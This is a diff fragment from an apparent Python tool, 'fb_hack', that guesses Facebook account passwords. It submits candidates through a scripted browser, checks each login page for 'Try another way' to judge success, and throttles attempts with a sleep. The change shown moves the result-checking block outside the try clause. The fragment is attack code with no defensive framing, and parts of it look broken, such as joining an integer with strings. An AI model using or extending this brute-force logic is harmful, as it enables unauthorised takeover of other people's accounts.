@@ -62,24 +62,24 @@ def fb_hack(email, codex):
     try:
       browser.form['pass'] = p
       browser.submit()
-      code1 = (int(counter), str(p), "failed")
-      code2 = (int(counter), str(p), "check")
-      h = " "
-      yo = h.join(code1)
-      yot = h.join(code2)
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      taw = soup.find(string="Try another way")
-      if taw != "None":
-        print(yo)
-      else:
-        print(yot)
-        break
     except:
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       with open("output1.html", "w") as file:
         file.write(str(soup))
+    code1 = (int(counter), str(p), "failed")
+    code2 = (int(counter), str(p), "check")
+    h = " "
+    yo = h.join(code1)
+    yot = h.join(code2)
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    taw = soup.find(string="Try another way")
+    if taw != "None":
+      print(yo)
+    else:
+      print(yot)
+      break
     sleepy(30)
     
   browser.select_form(nr=0)
